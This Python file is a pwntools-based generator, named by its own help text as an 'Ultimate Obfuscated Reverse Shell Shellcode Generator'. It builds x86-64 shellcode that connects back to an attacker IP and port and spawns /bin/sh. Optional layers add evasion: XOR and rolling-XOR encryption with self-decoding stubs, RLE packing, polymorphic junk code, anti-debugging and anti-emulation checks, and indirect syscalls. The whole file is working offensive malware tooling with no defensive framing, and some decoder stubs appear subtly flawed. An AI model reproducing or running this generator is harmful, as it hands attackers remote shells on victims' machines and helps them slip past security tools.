#!/usr/bin/env python3

import argparse
import random
import socket
import sys  # For stderr
import os  # For pid in labels
from pwn import *

# --- Configuration ---
# Suppress pwntools info/warning messages for cleaner output
# Comment out to see pwntools logs
context.log_level = 'error'
# Set target architecture
context.arch = 'amd64'

# --- Helper Functions ---

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

def remove_comments_from_assembly(assembly_code):
    """
    Removes comments from assembly code.

    Args:
        assembly_code: A string containing assembly code.

    Returns:
        A string containing the assembly code with comments removed.
    """
    lines = assembly_code.splitlines()
    cleaned_lines = []
    for line in lines:
        line = line.strip()  # Remove leading/trailing whitespace
        if not line:  # Skip empty lines
            continue
        comment_index = line.find('#')
        if comment_index != -1:
            cleaned_line = line[:comment_index].strip()
            if cleaned_line:  # Only append the line if it has code.
                cleaned_lines.append(cleaned_line)

        else:
            cleaned_lines.append(line)

    return '\n'.join(cleaned_lines)


myasm = lambda expr: asm(remove_comments_from_assembly(expr))


def xor_encrypt(data, key):
    """Encrypts data using a simple byte-wise XOR."""
    if not (0 <= key <= 255):
        raise ValueError("XOR key must be a byte value (0-255).")
    return bytes([b ^ key for b in data])


def rolling_xor_encrypt(data, key):
    """Encrypts data using rolling XOR (key increments)."""
    if not (0 <= key <= 255):
        raise ValueError("Rolling XOR key must be a byte value (0-255).")
    result = bytearray()
    current_key = key
    for b in data:
        encrypted_byte = b ^ current_key
        result.append(encrypted_byte)
        current_key = (current_key + 1) % 256  # Simple increment, can be more complex
    return bytes(result)

def rolling_xor_decoder_stub(original_size, start_key):
    """
    Generates a rolling XOR decoder stub.
    """
    decoder_asm = f"""
    mov rdi, rsp  # Destination (decode buffer)
    add rdi, 32   # Skip decoder stub itself
    mov rsi, rdi  # Source (encoded data)
    mov al, {start_key} # Starting XOR key

decode_rolling_xor:
    lodsb        # Load encoded byte
    xor al, [rsi-1] # XOR with current key
    stosb        # Store decoded byte
    inc al       # Increment XOR key
    cmp al, 0    # Wrap around if key reaches 256
    jne skip_wrap
    mov al, 0
skip_wrap:
    mov rax, rsp
    add rax, {32 + original_size}
    cmp rdi, rax
    jl decode_rolling_xor

    mov rax, rsp
    add rax, 32
    jmp rax
    """
    try:
        decoder_bytes = myasm(decoder_asm)
        while len(decoder_bytes) < 32:
            decoder_bytes += b'\x90' # Add NOPs until stub is 32 bytes
        return decoder_bytes
    except Exception as e:
        print(f"{RED}[-] Error assembling rolling XOR decoder stub: {e}{RESET}", file=sys.stderr)
        print(f"{RED}--- Failed Rolling XOR Decoder ASM --- \n{decoder_asm}\n--- END ---{RESET}", file=sys.stderr)
        raise


def rle_encode(data):
    """Encodes data using Run-Length Encoding."""
    result = bytearray()
    i = 0
    while i < len(data):
        count = 1
        # Check bounds and byte equality, ensure count doesn't exceed 255
        while i + count < len(data) and data[i] == data[i + count] and count < 255:
            count += 1
        result += bytes([count, data[i]])
        i += count
    return bytes(result)


def generate_polymorphic_junk():
    """Generates random, non-functional assembly instructions."""
    patterns = [
        "xor rcx, rcx",  # Zero out rcx
        "add rdx, 0",  # No operation add
        "lea rsi, [rsi + 0]",  # No operation lea
        "mov r9, r9",  # Move register to itself
        "push rbx; pop rbx",  # Push/pop doesn't change state (except flags)
        "nop",  # No operation
        "xchg rax, rax",  # No operation exchange
        "test r8, r8",  # Test register (only affects flags)
        "cdqe"  # Sign-extend EAX into RAX (often no effect if RAX already used)
    ]
    junk_asm = ''
    # Generate 3 to 7 junk instructions
    for _ in range(random.randint(3, 7)):
        junk_asm += random.choice(patterns) + "; "  # pwntools handles ';' here ok when separated
    # Assemble the junk instructions into bytes
    try:
        return myasm(junk_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling junk code: {e}{RESET}", file=sys.stderr)
        print(f"{RED}--- Failed Junk ASM --- \n{junk_asm}\n--- END ---{RESET}", file=sys.stderr)
        raise


def rle_decoder_stub(original_size):
    """
    Generates the RLE decoder stub.
    Assumes encoded data starts immediately after this stub.
    Decodes in-place onto the stack, overwriting the stub and encoded data.
    Execution jumps to the start of the decoded payload afterwards.
    """
    # Use a simple placeholder calculation first to estimate size accurately
    placeholder_decoder = f"""
    mov rdi, rsp
    add rdi, 100 # Placeholder size
    mov rsi, rdi
    decode_rle_placeholder:
    lodsb; mov cl, al; lodsb; jecxz s_p; .r_p: stosb; loop .r_p; s_p:
    mov rax, rsp; add rax, {100 + original_size}; cmp rdi, rax
    jl decode_rle_placeholder
    mov rax, rsp; add rax, 100; jmp rax
    """
    try:
        stub_size = len(myasm(placeholder_decoder))
    except Exception as e:
        print(f"{RED}[-] Error assembling placeholder RLE stub: {e}{RESET}", file=sys.stderr)
        raise

    # Now generate the real stub with the calculated size
    final_decoder_asm = f"""
    mov rdi, rsp  # Decode buffer starts right after the stub
    add rdi, {stub_size}
    mov rsi, rdi  # Source (encoded data) also starts after the stub

decode_rle_final:
    lodsb      # Load count into al from [rsi], rsi++
    mov cl, al   # Use cl as the counter for loop
    lodsb      # Load data byte into al from [rsi], rsi++
    jecxz skip_stosb_final # Skip if count is zero (should not happen in valid RLE)

.repeat_final:
    stosb      # Store al into [rdi], rdi++
    loop .repeat_final # Decrement cx, loop if cx != 0

skip_stosb_final:
    # Compare the destination pointer (rdi) against the expected end
    # Expected end = rsp + stub_size + original_size
    mov rax, rsp  # Use register for calculation to avoid immediate size limits
    add rax, {stub_size + original_size}
    cmp rdi, rax
    jl decode_rle_final # Jump if destination pointer is still before the end point

    # Jump to the decoded code which now starts at rsp + stub_size
    mov rax, rsp
    add rax, {stub_size}
    jmp rax
    """
    try:
        final_stub_bytes = myasm(final_decoder_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling final RLE stub: {e}{RESET}", file=sys.stderr)
        print(f"{RED}--- Final RLE ASM --- \n{final_decoder_asm}\n--- END ---{RESET}", file=sys.stderr)
        raise

    # Sanity check/recalculation if size changed drastically (rare but possible)
    # Use a simpler check/retry mechanism for stability
    new_stub_size = len(final_stub_bytes)
    if abs(new_stub_size - stub_size) > 8:  # Allow some tolerance
        print(f"{YELLOW}[*] RLE Stub size recalculated: {new_stub_size} bytes. Retrying stub generation...{RESET}", file=sys.stderr)
        # Limit recursion depth to prevent infinite loops if size oscillates
        depth = getattr(rle_decoder_stub, 'recursion_depth', 0)
        if depth > 3:
            raise RecursionError("RLE stub size calculation failed to stabilize.")
        setattr(rle_decoder_stub, 'recursion_depth', depth + 1)
        result = rle_decoder_stub(original_size)  # Retry
        delattr(rle_decoder_stub, 'recursion_depth')  # Clear depth on successful return
        return result
    else:
        # Clear depth if calculation is stable on this attempt
        if hasattr(rle_decoder_stub, 'recursion_depth'):
            delattr(rle_decoder_stub, 'recursion_depth')

    return final_stub_bytes

# --- Core Payload Generation ---

def generate_payload(ip, port, executable_path, junk, anti_emulation, stack_pivot,
                    obfuscate_path, anti_debug, indirect_syscalls):  # Added new flags
    """Generates the core reverse shell payload with optional features."""

    payload_asm = ""

    # --- Define labels used across techniques ---
    # Make labels slightly more unique to avoid clashes if sections get complex
    pid = os.getpid()  # Add process ID for temp uniqueness
    path_decode_loop_label = f"path_decode_loop_{pid}"
    ptrace_fail_label = f"being_traced_exit_{pid}"
    syscall_gadget_label = f"syscall_gadget_{pid}"
    main_code_end_label = f"main_code_end_{pid}"
    dup_loop_label = f"dup_loop_{pid}"  # Label for dup2 loop

    # --- XOR key for path obfuscation (fixed for simplicity, could be random) ---
    path_xor_key = 0x42  # Example key

    # --- Define the syscall instruction/call based on the flag ---
    # Do this early to use it throughout
    syscall_instruction = f"call {syscall_gadget_label}" if indirect_syscalls else "syscall"

    # --- Optional Stack Pivot ---
    if stack_pivot:
        payload_asm += "    sub rsp, 0x500 # Stack Pivot\n"  # USE HASH #

    # --- Optional Anti-Debugging (ptrace check) ---
    if anti_debug:
        payload_asm += f"""
        # --- Anti-Debugging: ptrace(PTRACE_TRACEME) check ---
        mov rax, 101       # SYS_ptrace
        mov rdi, 0          # PTRACE_TRACEME request
        xor rsi, rsi        # arg3 = 0
        xor rdx, rdx        # arg4 = 0
        {syscall_instruction}
        test rax, rax       # Check result in rax
        js {ptrace_fail_label} # Jump if negative (error/traced)
        """  # USE HASH #

    # --- Optional Anti-Emulation (Timing, CPUID) ---
    if anti_emulation:
        payload_asm += """
        # --- Anti-Emulation: RDTSC/CPUID timing check ---
        rdtsc              # Read timestamp counter
        mov r10, rax        # Store lower 64 bits
        mov r11, rdx        # Store higher 64 bits (if needed, often 0)
        nop; nop; nop; nop;
        cpuid              # CPU identification (can crash simple emulators/reveal info)
        nop; nop; nop; nop;
        rdtsc              # Read timestamp counter again
        sub rax, r10        # Calculate time difference (lower bits)
        sbb rdx, r11        # Calculate difference (higher bits with borrow)
        # Add comparison logic here based on rax/rdx difference if needed
        """  # USE HASH #
    if ip and port:
      try:
          ip_bytes = socket.inet_aton(ip)  # Use standard library for robust IP parsing
      except OSError:
          raise ValueError(f"Invalid IP address format: {ip}")
      port_bytes = port.to_bytes(2, 'big')  # Port in network byte order (big endian)
      # --- Core Reverse Shell Logic ---
      payload_asm += f"""
          # --- Core Reverse Shell Logic ---
          # socket(AF_INET, SOCK_STREAM, 0)
          mov rax, 41         # SYS_socket
          mov rdi, 2          # AF_INET (IPv4)
          mov rsi, 1          # SOCK_STREAM (TCP)
          xor rdx, rdx        # protocol = 0
          {syscall_instruction}
          mov rdi, rax        # Save sockfd in rdi for connect() and dup2()

          # connect(sockfd, sockaddr_in*, 16)
          sub rsp, 16         # Reserve space for sockaddr_in struct on stack
          mov dword ptr [rsp+4], 0x{ip_bytes.hex()} # sin_addr (already network byte order)
          mov word ptr [rsp+2], 0x{port_bytes.hex()}  # sin_port (network byte order)
          mov word ptr [rsp], 2          # sin_family = AF_INET
          mov rax, 42         # SYS_connect
          # rdi holds sockfd
          mov rsi, rsp        # Pointer to sockaddr_in struct
          mov rdx, 16         # sizeof(sockaddr_in)
          {syscall_instruction}
          add rsp, 16         # Clean up stack space used by sockaddr_in

          # dup2(sockfd, 0..2) - Redirect stdin, stdout, stderr
          mov rsi, 0          # Start with target fd 0 (stdin)
      {dup_loop_label}:       # Use unique label
          mov rax, 33         # SYS_dup2
          # rdi still holds sockfd from connect/socket
          # rsi holds the target fd (0, 1, or 2)
          {syscall_instruction}
          inc rsi             # Next target fd
          cmp rsi, 3          # Check if we have done 0, 1, 2
          jne {dup_loop_label} # Loop if not done
      """  # USE HASH #

    # --- Executable Path Pushing & Optional Obfuscation ---
    # Prepare the string: encode, null-terminate, pad to multiple of 8 bytes
    try:
        exec_bytes = executable_path.encode('utf-8') + b'\x00'
    except UnicodeEncodeError:
        raise ValueError(f"Executable path '{executable_path}' contains non-UTF8 characters.")
    padding_needed = (8 - (len(exec_bytes) % 8)) % 8
    padded_exec_bytes = exec_bytes + (b'\x00' * padding_needed)
    exec_len = len(padded_exec_bytes)

    # Apply XOR obfuscation *before* generating push instructions if flag is set
    if obfuscate_path:
        print(f"{YELLOW}[*] Obfuscating execution path '{executable_path}' with XOR key {path_xor_key:#04x}{RESET}", file=sys.stderr)
        final_exec_bytes = bytes([b ^ path_xor_key for b in padded_exec_bytes])
    else:
        final_exec_bytes = padded_exec_bytes

    payload_asm += f"\n        # --- Push {'obfuscated ' if obfuscate_path else ''}executable path '{executable_path}\\0' onto stack ({exec_len} bytes padded) ---\n"  # USE HASH #
    # Push the padded string onto the stack 8 bytes at a time (in reverse order)
    for i in range(exec_len - 8, -8, -8):
        chunk = final_exec_bytes[i:i + 8]
        chunk_int = int.from_bytes(chunk, 'little')  # Convert 8-byte chunk to integer
        payload_asm += f"        mov rax, {chunk_int:#018x} # Push bytes {chunk.hex()}\n"  # USE HASH #
        payload_asm += "        push rax\n"

    payload_asm += "        mov rdi, rsp         # rdi points to the string on stack\n"  # USE HASH #

    # --- Optional Path Decoding ---
    if obfuscate_path:
        payload_asm += f"""
        # --- Decode obfuscated path string in-place on stack ---
        mov rcx, {exec_len}      # Length of the string
        mov rbx, rdi          # Start address (from rsp)
    {path_decode_loop_label}:
        xor byte ptr [rbx], {path_xor_key:#04x} # XOR byte with the key
        inc rbx              # Move to next byte
        loop {path_decode_loop_label}         # Loop until rcx is 0
        # RDI still points to the start of the now-decoded string
        """  # USE HASH #

    # --- Final execve Call ---
    payload_asm += f"""
        # --- Final execve call ---
        mov rax, 59         # SYS_execve
        # rdi points to the (now possibly decoded) executable path
        xor rsi, rsi        # argv = NULL
        xor rdx, rdx        # envp = NULL
        {syscall_instruction}
        # If execve succeeds, execution stops here. If it fails, continue...
        """  # USE HASH #

    # --- Exit logic / Syscall Gadget / Failure Paths ---
    payload_asm += f"""
        # --- Exit / Failure Paths / Syscall Gadget ---
        jmp {main_code_end_label} # Jump past helper code/data if execve failed somehow

    {ptrace_fail_label}:         # Label for ptrace failure exit
        mov rax, 60         # SYS_exit
        mov rdi, 1          # Exit code 1 (indicates traced or error)
        {'syscall' if not indirect_syscalls else f'call {syscall_gadget_label}'} # Try intended method first
        syscall             # Direct syscall as a fallback if gadget fails

    """  # USE HASH #

    # --- Syscall Gadget (if needed) ---
    if indirect_syscalls:
        try:
            # Gadget: syscall; ret
            syscall_ret_bytes = myasm('syscall; ret')  # Use pwntools to assemble the gadget itself
        except Exception as e:
            print(f"{RED}[-] Error assembling syscall gadget: {e}{RESET}", file=sys.stderr)
            raise
        payload_asm += f"""
    {syscall_gadget_label}:
        # Gadget: syscall; ret ({syscall_ret_bytes.hex()})
        #db {', '.join(hex(b) for b in syscall_ret_bytes)} # Define bytes for gadget
        .byte {', '.join(hex(b) for b in syscall_ret_bytes)} # Define bytes for gadget

        
        """  # USE HASH #

    # --- End of main code label / Final Exit ---
    payload_asm += f"""
    {main_code_end_label}:
        # Exit cleanly if execve failed or code reaches here unexpectedly
        mov rax, 60         # SYS_exit
        xor rdi, rdi        # Exit code 0
        {'syscall' if not indirect_syscalls else f'call {syscall_gadget_label}'} # Try intended method
        syscall             # Direct syscall fallback
    """  # USE HASH #

    # --- Assemble ---
    try:
        # Uncomment to debug generated assembly before assembly
        # print("--- Generated ASM ---", file=sys.stderr)
        # print(payload_asm, file=sys.stderr)
        # print("---------------------", file=sys.stderr)
        payload_bytes = myasm(payload_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling core payload: {e}{RESET}", file=sys.stderr)
        # Print failed assembly only on error
        print(f"{RED}--- Failed ASM --- \n{payload_asm}\n--- END ---{RESET}", file=sys.stderr)
        raise

    # --- Add Junk (if requested) ---
    # Junk code assembly happens separately now, less likely to interfere
    if junk:
        print(f"{YELLOW}[*] Inserting polymorphic junk code...{RESET}", file=sys.stderr)
        junk_bytes = generate_polymorphic_junk()
        payload_bytes = junk_bytes + payload_bytes  # Prepend junk

    return payload_bytes

# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(
        description="Ultimate Obfuscated Reverse Shell Shellcode Generator",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter  # Show defaults in help
    )

    # Connection Arguments
    conn_group = parser.add_argument_group('Connection Arguments')
    conn_group.add_argument("--ip", help="Attacker IP Address")
    conn_group.add_argument("--port", type=int, help="Attacker Listener Port")
    conn_group.add_argument("-e", "--executable", default="/bin/sh", help="Executable path for execve")

    # Obfuscation/Evasion Arguments
    evasion_group = parser.add_argument_group('Obfuscation & Evasion Arguments')
    evasion_group.add_argument("--xor-key", type=lambda x: int(x, 0), help="Simple XOR key (0-255) for final payload obfuscation")
    evasion_group.add_argument("--rolling-xor-key", type=lambda x: int(x, 0), help="Apply rolling XOR encryption (key++) with the given starting key (0-255) [Decoder included]")
    evasion_group.add_argument("--rle", action="store_true", help="Enable RLE encoding (with self-decoder stub)")
    evasion_group.add_argument("--junk", action="store_true", help="Insert polymorphic junk code")
    evasion_group.add_argument("--obfuscate-path", action="store_true", help="XOR obfuscate the executable path string in memory (self-decoding)")
    evasion_group.add_argument("--indirect-syscalls", action="store_true", help="Use indirect calls to a 'syscall; ret' gadget")
    evasion_group.add_argument("--anti-emulation", action="store_true", help="Insert basic anti-emulation tricks (rdtsc, cpuid)")
    evasion_group.add_argument("--anti-debug", action="store_true", help="Add anti-debugging check (ptrace PTRACE_TRACEME)")
    evasion_group.add_argument("--stack-pivot", action="store_true", help="Enable simple stack pivot (sub rsp, 0x500)")

    args = parser.parse_args()

    # --- Sanity Checks ---
    if args.xor_key is not None and args.rolling_xor_key is not None:
        print(f"{RED}[-] Error: Cannot use both --xor-key and --rolling-xor-key at the same time.{RESET}", file=sys.stderr)
        sys.exit(1)
    if args.xor_key is not None and not (0 <= args.xor_key <= 255):
        print(f"{RED}[-] Error: XOR key must be between 0 and 255.{RESET}", file=sys.stderr)
        sys.exit(1)
    if args.rolling_xor_key is not None and not (0 <= args.rolling_xor_key <= 255):
        print(f"{RED}[-] Error: Rolling XOR key must be between 0 and 255.{RESET}", file=sys.stderr)
        sys.exit(1)
    if args.port and (args.port <= 0 or args.port > 65535):
        print(f"{RED}[-] Error: Port must be between 1 and 65535.{RESET}", file=sys.stderr)
        sys.exit(1)
    if not args.ip and args.port:
        print(f"{RED}[-] Error: Port provided without IP address.{RESET}", file=sys.stderr)
        sys.exit(1)

    try:
        # --- Generation Pipeline ---
        print(f"{YELLOW}[*] Generating core payload...{RESET}", file=sys.stderr)
        # Pass all relevant flags to the generator function
        core_payload = generate_payload(
            args.ip, args.port, args.executable,
            args.junk, args.anti_emulation, args.stack_pivot,
            args.obfuscate_path, args.anti_debug, args.indirect_syscalls
        )
        print(f"{YELLOW}[*] Core payload size: {len(core_payload)} bytes{RESET}", file=sys.stderr)

        final_payload = core_payload
        payload_size_before_rle = len(final_payload)  # Keep track for RLE stub

        # --- Apply RLE (Happens before final XOR/Rolling XOR) ---
        if args.rle:
            print(f"{YELLOW}[*] Applying RLE encoding...{RESET}", file=sys.stderr)
            encoded_payload = rle_encode(final_payload)
            print(f"{YELLOW}[*] RLE Encoded payload size: {len(encoded_payload)} bytes{RESET}", file=sys.stderr)
            # Pass size of payload *before* RLE encoding to stub generator
            decoder_stub = rle_decoder_stub(payload_size_before_rle)
            print(f"{YELLOW}[*] RLE Decoder stub size: {len(decoder_stub)} bytes{RESET}", file=sys.stderr)
            final_payload = decoder_stub + encoded_payload
            print(f"{YELLOW}[*] Total size with RLE stub: {len(final_payload)} bytes{RESET}", file=sys.stderr)

        # --- Apply Final Encryption (XOR or Rolling XOR) ---
        if args.xor_key is not None:
            print(f"{YELLOW}[*] Applying simple XOR encryption with key: {args.xor_key:#04x}{RESET}", file=sys.stderr)
            final_payload = xor_encrypt(final_payload, args.xor_key)

        if args.rolling_xor_key is not None:
            print(f"{YELLOW}[*] Applying rolling XOR encryption with starting key: {args.rolling_xor_key:#04x}{RESET}", file=sys.stderr)
            decoder_stub = rolling_xor_decoder_stub(len(final_payload), args.rolling_xor_key)
            final_payload = decoder_stub + rolling_xor_encrypt(final_payload, args.rolling_xor_key)
            print(f"{YELLOW}[*] Rolling XOR decoder stub size: {len(decoder_stub)} bytes{RESET}", file=sys.stderr)
            print(f"{YELLOW}[*] Total size with rolling XOR stub: {len(final_payload)} bytes{RESET}", file=sys.stderr)

        # --- Output Final Shellcode ---
        print(f"\n{GREEN}[+] Final Shellcode ({len(final_payload)} bytes):{RESET}")
        # Print in \x format suitable for C/Python etc.
        print(''.join(f"\\x{b:02x}" for b in final_payload))
        # Example usage hint
        print(f"\n{YELLOW}[*] Example Usage (Python):{RESET}")
        print(f"shellcode = b\"{''.join(f'\\x{b:02x}' for b in final_payload)}\"")

    except ValueError as e:
        print(f"\n{RED}[-] Error: {e}{RESET}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:  # Catch pwntools assembly errors etc.
        print(f"\n{RED}[-] An unexpected error occurred during generation: {e}{RESET}", file=sys.stderr)
        # Uncomment for detailed traceback during development
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
